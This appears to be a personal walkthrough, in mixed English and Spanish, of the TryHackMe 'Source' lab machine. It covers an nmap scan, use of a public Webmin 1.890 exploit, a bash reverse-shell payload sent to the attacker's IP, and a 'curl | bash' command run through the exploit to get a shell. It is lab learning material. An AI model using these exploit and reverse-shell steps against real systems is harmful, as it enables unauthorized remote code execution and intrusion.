# Source machine # 

**This machine is from tryhackme**

First step is connect to try hackme on a VPN with openvpn in the /Descargas folder, with our archive  the comand is:

*sudo openvpn cabezacortada.ovepn*

Now we are connected and we have an IP on that network , the second step is create a folder on the :
**/Documentos/Workspace/Virtual machines/pentesting/source** folder
Now we can work correctly

Now we use :

*ping -c 1 10.10.118.101* -This is the ip of the machine that we are going to attack

![[ttl.png]]

Mario says that TTL in the number 63 or 64, that corresponds to a Linux machine
on Windows it will be different 126 or 127 (??)

Now we use nmap 
*nmap -p- --open -sS -sC -sV -min-rate 5000 -vvv -n -Pn 10.10.118.101 -on SOURCEscn*
![[scansource.png]]

***SEGUN EL PINGUINO DE MARIO 
-p-  --open escanea puertos abiertos
-sV LA VERSION DE LOS SERVICIOS
-sS SYN SCAN mas sigiloso.
-min-rate 5000 para que valla mas rapido
-vvv para que reporte lo que va sacando
-n para evitar que haga resolucion DNS
-Pn evitar que haga PING en el ip***

And here is the scan 
![[nmapsource.png]]
Port 22 is vulnerable because the versions of OPEN SSH less than 7.7 are vulnerable
We are going to search on the port 10000 and we will see what is on this server

and... this is what we can se 
![[sourcewebmin.png]]

Now we are going to se the source code of the web site
![[sourcecodesource.png]]

One thing that we can do is search te version of webmin, but Mario cannot see it.
we are going to watch in google if we have some exploit for "webmin"

and we are going to use this repository of github :
https://github.com/n0obit4/Webmin_1.890-POC

and this is the guide of use 
We can put a comand in the and we ned a  -host(victims ip)       -cmd
![[exploitwebmin.png]]
We are not going to use *gitclone* we are going to use *raw* to get just **the file that we are interested in**

![[raw1.png]]
first we make click on raw
![[raw2.png]]

***wget https://raw.githubusercontent.com/n0obit4/Webmin_1.890-POC/master/Webmin_exploit.py*** 
secondly we copy the link on our console , inside the folder that we are working , so we can download the exploit

It's time to use the exploit :

*python Webmin_exploit.py -host 10.10.118.101 -port 10000 -cmd whoami*
![[itworks.png]]

As you can see it works, now we need yo win our reverse shell, we are going to do this first making a server on python, on the port 80, in the same folder that we are working on.

we create a folder with mkdir and inside we put a archive with the name 
index.html and inside of this we put this 

**#!/bin/bash

bash -i >& /dev/tcp/10.18.49.235/443 0>&1**

we will listen over our computer on the port 443 with netcat  and when the victim execute this we are going to get the reverse shell.
![[1.png]]

![[Cibersecurity/Virtual Machines/TryHackMe Machines/Source/IMAGES/2.png]]

![[Cibersecurity/Virtual Machines/TryHackMe Machines/Source/IMAGES/3.png]]

CON EL EXPLOIT QUE HABIAMOS ECHO DESCARGA EL ARCHIVO CON CURL Y DESPUES LO EJECUTA CON BASH, DESDE EL SERVIDOR QUE HABIAMOS CREADO 

![[4.png]]

*python Webmin_exploit.py -host 10.10.118.101 -port 10000 -cmd 'curl 10.18.49.235 | bash'*


Y FINALMENTE TENEMOS LA SHELL 

![[shellllll.png]]

